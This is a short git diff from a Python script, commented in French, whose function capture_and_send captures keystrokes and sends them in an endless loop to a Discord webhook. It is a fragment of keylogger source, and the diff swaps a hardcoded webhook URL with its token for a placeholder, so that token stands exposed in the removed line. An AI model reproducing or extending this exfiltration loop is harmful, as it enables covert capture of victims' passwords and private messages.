@@ -52,7 +52,7 @@ def send_discord_message(webhook_url, message):
 
 # Fonction pour capturer les frappes et envoyer le message en boucle infinie
 def capture_and_send():
-    webhook_url = 'https://discord.com/api/webhooks/1284509361833508954/KNP27em7FaHh5gh4uCE-kDT_HdZYXpxLJoUIbwoRGrNytbfKnTp9jzKUDHiAbEZNnqRZ'
+    webhook_url = 'DISCORD_WEBHOOK'
     while True:
         message = print_log()
         if webhook_url:
